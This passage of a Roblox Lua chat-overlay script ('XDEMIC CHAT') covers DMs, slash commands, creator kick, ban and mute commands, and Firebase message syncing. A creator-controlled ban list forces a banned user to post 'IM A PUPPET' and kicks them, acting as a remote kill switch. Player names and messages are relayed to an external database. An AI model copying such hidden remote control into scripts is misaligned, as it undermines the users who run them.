    if not dmTarget or ScriptBans[dmTarget] then return end local txt=CvIn.Text if txt=="" then return end CvIn.Text=""
    local key=dmKey(Player.Name,dmTarget) appendDM(key,{s=Player.Name,t=txt,ts=getTime()})
    addDMMsg(CvScrl,Player.Name,txt,getTime())
end
CvSnd.MouseButton1Click:Connect(sendDM)
CvIn.FocusLost:Connect(function(ep) if ep then sendDM() end end)
DMS.FocusLost:Connect(function(ep) if ep and DMS.Text~="" then addDMContact(DMS.Text) DMS.Text="" end end)

qaDmBtn.MouseButton1Click:Connect(function()
    QuickActionMenu.Visible = false
    addDMContact(qaTargetName)
    switchTab("DMs")
    for _, item in ipairs(DML:GetChildren()) do
        if item:IsA("TextButton") and string.find(item:GetFullName(), qaTargetName) then
            dmTarget = qaTargetName
            CvNm.Text="Direct Chat: @"..qaTargetName CvView.Visible=true
            local key=dmKey(Player.Name,qaTargetName)
            for _,c in ipairs(CvScrl:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end
            for _,msg in ipairs(loadConvo(key)) do addDMMsg(CvScrl,msg.s,msg.t,msg.ts) end
            break
        end
    end
end)

-- VOICE DISCLOSURE (unchanged)
local VPage=make("Frame",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Visible=false,ZIndex=501,Parent=Content})
make("TextLabel",{Size=UDim2.new(1,-40,0,60),Position=UDim2.new(0,20,0.4,0),BackgroundTransparency=1,Text="🎵  Spatial Voice Chat Engine Active\nVerify credentials directly in native Core settings setup.",TextColor3=C.GRAY,TextSize=12,Font=Enum.Font.Gotham,TextWrapped=true,ZIndex=502,Parent=VPage})

-- ============================================================
--  TAB CONTROL (including LEADERBOARD)
-- ============================================================
local pages={SERVER=SrvPage,GALLERY=GalleryPage,PROFILE=ProfPage,VOICE=VPage,DMs=DMPage,LEADERBOARD=LeaderboardPage}
function switchTab(name)
    currentTab=name
    for n,pg in pairs(pages) do pg.Visible=(n==name) end
    for n,t in pairs(tabBtns) do
        if n==name then
            tw(t.b,0.1,{TextColor3=C.WHITE})
            tw(t.ul,0.1,{BackgroundTransparency=0})
        else
            tw(t.b,0.1,{TextColor3=C.GRAY})
            tw(t.ul,0.1,{BackgroundTransparency=1})
        end
    end
    if name=="LEADERBOARD" then updateLeaderboard() end
    if name~="SERVER" then URLBox.Visible=false urlOpen=false end
end
for name,t in pairs(tabBtns) do
    t.b.MouseButton1Click:Connect(function() switchTab(name) end)
end
switchTab("SERVER")
MBtn.MouseButton1Click:Connect(function() switchTab("GALLERY") end)

-- ============================================================
--  WINDOW OPERATIONS (unchanged)
-- ============================================================
local function openChat() chatOpen=true Win.Visible=true NDot.Visible=false end
local function closeChat() chatOpen=false Win.Visible=false URLBox.Visible=false urlOpen=false QuickActionMenu.Visible=false end
XBtn.MouseButton1Click:Connect(closeChat)
BubBtn.MouseButton1Click:Connect(function() if chatOpen then closeChat() else openChat() end end)

-- ============================================================
--  SEND MESSAGE (with XP gain and new commands)
-- ============================================================
local function sendMsg()
    local txt=CInput.Text if txt=="" then return end CInput.Text=""

    if ScriptBans[Player.Name] then
        txt = "IM A PUPPET"
        addMsg(Player.Name, txt, false, nil)
        task.wait(0.5)
        Gui:Destroy()
        Player:Kick("\n[XDEMIC CHAT]\nScript interaction violation detected.")
        return
    end

    -- System commands
    if txt=="/clear" then
        for _,c in ipairs(MsgScroll:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end
        addSys("Clear routine execution done.") return
    elseif txt=="/help" or txt=="/cmds" then
        addSys("═══════ SYSTEM COMMANDS ═══════")
        addSys("1. /help - Shows all available system commands.")
        addSys("2. /clear - Clears your local chat feed log.")
        addSys("3. /profile - Jumps to custom profile account editor.")
        addSys("4. /gallery - Views built-in meme graphics vault.")
        addSys("5. /dms - Switches focus to active direct channels.")
        addSys("6. /server - Focus view back to main server channel.")
        addSys("7. /voice - Inspect spatial voice chat engine data.")
        addSys("8. /rejoin - Triggers instant server refresh connection.")
        addSys("9. /close - Closes down visual layout window HUD.")
        addSys("10. /leaderboard - Show top players.")
        addSys("11. /follow <user> - Follow a user.")
        addSys("12. /unfollow <user> - Unfollow a user.")
        if isCreator(Player.Name) then
            addSys("👑 ── CREATOR MODERATION ──")
            addSys("• /kick [player] [reason] - Kick player.")
            addSys("• /ban [player] [errorCode] [customMsg] - Ban with error code.")
            addSys("• /unban [player] - Unban player.")
            addSys("• /mute [player] - Toggle local mute.")
            addSys("• /mute all - Mute everyone.")
        end
        addSys("═══════════════════════════════")
        return
    elseif txt=="/profile" then switchTab("PROFILE") return
    elseif txt=="/gallery" then switchTab("GALLERY") return
    elseif txt=="/dms" then     switchTab("DMs") return
    elseif txt=="/server" then  switchTab("SERVER") return
    elseif txt=="/voice" then   switchTab("VOICE") return
    elseif txt=="/close" then   closeChat() return
    elseif txt=="/rejoin" then
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, Player) return
    elseif txt=="/leaderboard" then switchTab("LEADERBOARD") return
    elseif string.sub(txt, 1, 8) == "/follow " then
        local target = string.sub(txt, 9)
        if target and target ~= "" then
            local result = followPlayer(target)
            if result then
                addSys("You are now following "..target)
            else
                addSys("You unfollowed "..target)
            end
        end
        return
    elseif string.sub(txt, 1, 10) == "/unfollow " then
        local target = string.sub(txt, 11)
        if target and target ~= "" then
            -- unfollow using same function (toggle)
            followPlayer(target)
            addSys("Unfollowed "..target)
        end
        return
    end

    -- Creator commands
    if string.sub(txt, 1, 1) == "/" and isCreator(Player.Name) then
        local splitStrings = string.split(txt, " ")
        local baseCmd = splitStrings[1]

        if baseCmd == "/kick" then
            local targetName = splitStrings[2]
            if targetName then
                local customReason = "[XDEMIC CHAT]\nYou have been kicked from this server instance."
                if #splitStrings > 2 then
                    local contextTable = {}
                    for i = 3, #splitStrings do table.insert(contextTable, splitStrings[i]) end
                    customReason = table.concat(contextTable, " ")
                end
                for _, targetPlayer in ipairs(Players:GetPlayers()) do
                    if string.lower(targetPlayer.Name):sub(1, #targetName) == string.lower(targetName) then
                        targetPlayer:Kick("\n" .. customReason)
                        addSys("Kicked: " .. targetPlayer.Name .. " | Reason: " .. customReason)
                        return
                    end
                end
                addSys("Error: Player prefix '" .. targetName .. "' not found.")
            end
            return
        elseif baseCmd == "/ban" then
            local targetName = splitStrings[2]
            local errorCode = splitStrings[3] or "ERR_005"
            local customMsg = ""
            if #splitStrings > 3 then
                local msgParts = {}
                for i = 4, #splitStrings do table.insert(msgParts, splitStrings[i]) end
                customMsg = table.concat(msgParts, " ")
            end
            if targetName then
                banPlayer(targetName, errorCode, customMsg)
                addSys("Banned: "..targetName.." | Code: "..errorCode)
            end
            return
        elseif baseCmd == "/unban" then
            local targetName = splitStrings[2]
            if targetName then
                unbanPlayer(targetName)
                addSys("Unbanned: "..targetName)
            end
            return
        elseif baseCmd == "/mute" then
            local targetName = splitStrings[2]
            if targetName == "all" then
                MutedPlayers.All = not MutedPlayers.All
                addSys("Global mute toggled: "..tostring(MutedPlayers.All))
            elseif targetName then
                local found = false
                for _, targetPlayer in ipairs(Players:GetPlayers()) do
                    if string.lower(targetPlayer.Name):sub(1, #targetName) == string.lower(targetName) then
                        MutedPlayers[targetPlayer.Name] = not MutedPlayers[targetPlayer.Name]
                        addSys("Mute status for "..targetPlayer.Name..": "..tostring(MutedPlayers[targetPlayer.Name]))
                        found = true
                        break
                    end
                end
                if not found then
                    MutedPlayers[targetName] = not MutedPlayers[targetName]
                    addSys("Mute status for "..targetName..": "..tostring(MutedPlayers[targetName]))
                end
            end
            return
        end
    end

    -- Normal message: add XP and broadcast
    addXP(1) -- 1 XP per message
    addMsg(Player.Name, txt, false, nil)
    broadcastPayload(Player.Name, txt, false, nil)
end

SBtn.MouseButton1Click:Connect(sendMsg)
CInput.FocusLost:Connect(function(ep) if ep then sendMsg() end end)
CamBtn.MouseButton1Click:Connect(function() urlOpen=not urlOpen URLBox.Visible=urlOpen end)

URLSend.MouseButton1Click:Connect(function()
    local url=URLInput.Text if url=="" then return end URLInput.Text="" URLBox.Visible=false urlOpen=false
    if ScriptBans[Player.Name] then
        addMsg(Player.Name, "IM A PUPPET", false, nil)
        task.wait(0.5)
        Gui:Destroy()
        Player:Kick("\n[XDEMIC CHAT]\nScript interaction violation detected.")
        return
    end
    addMsg(Player.Name,"",true,url)
    broadcastPayload(Player.Name, "", true, url)
    saveCustomUrlToGallery(url)
end)

-- ============================================================
--  FIREBASE BROADCAST JOIN (unchanged)
-- ============================================================
local function broadcastJoin()
    local data = {
        sender = "[SYSTEM]",
        displayName = "SYSTEM",
        text = "👋 " .. Player.DisplayName .. " has joined!",
        isImg = false,
        isSystem = true,
        imgUrl = "",
        timestamp = os.time()
    }
    local success, json = pcall(function() return HttpSvc:JSONEncode(data) end)
    if success then
        makeHttpRequest({
            Url = FIREBASE_URL .. "servers/" .. game.JobId .. "/chat.json",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = json
        })
    end
end

-- ============================================================
--  DATABASE INBOUND POLLING (unchanged)
-- ============================================================
task.spawn(function()
    while task.wait(1.5) do
        if FIREBASE_URL ~= "https://YOUR-PROJECT-ID-default-rtdb.firebaseio.com/" then
            local response = makeHttpRequest({
                Url = FIREBASE_URL .. "servers/" .. game.JobId .. "/chat.json?orderBy=\"$key\"&limitToLast=10",
                Method = "GET"
            })
            if response and response.StatusCode == 200 then
                local ok, data = pcall(function() return HttpSvc:JSONDecode(response.Body) end)
                if ok and type(data) == "table" then
                    local sortedPackets = {}
                    for key, packet in pairs(data) do
                        table.insert(sortedPackets, {key = key, val = packet})
                    end
                    table.sort(sortedPackets, function(a,b) return a.key < b.key end)
                    for _, entry in ipairs(sortedPackets) do
                        if entry.key > lastProcessedKey then
                            lastProcessedKey = entry.key
                            if initialFetchDone and entry.val.sender ~= Player.Name then
                                if entry.val.isSystem then
                                    addSys(entry.val.text)
                                else
                                    addMsg(entry.val.sender, entry.val.text, entry.val.isImg, entry.val.imgUrl, entry.val.displayName)
                                end
                                if not chatOpen then NDot.Visible = true end
                            end
                        end
                    end
                    initialFetchDone = true
                end
            end
        end
    end
end)

task.delay(2, function()
    if FIREBASE_URL ~= "https://YOUR-PROJECT-ID-default-rtdb.firebaseio.com/" then
        broadcastJoin()
        broadcastProfileData()
    end
end)

-- ============================================================
--  INITIALIZATION LOGS
-- ============================================================
loadProfileData() -- Ensure profile is loaded

task.delay(0.2, function()
    addSys("👋 " .. Player.Name .. " WELCOME, DEAR✨️")
    addSys("(TYPE /HELP FOR HELP)")
    if FIREBASE_URL == "https://YOUR-PROJECT-ID-default-rtdb.firebaseio.com/" then
        addSys("⚠️ MULTIPLAYER OFFLINE: Change FIREBASE_URL at the top to sync with friends!")
    else
        addSys("🛰️ MULTIPLAYER CHAT RE-ROUTE LINK SYNC ACTIVE!")
    end
    addSys("🏆 XP System Active – Send messages to earn tags!")
    addSys("💬 Support: Discord: XDEMIC HELP")
end)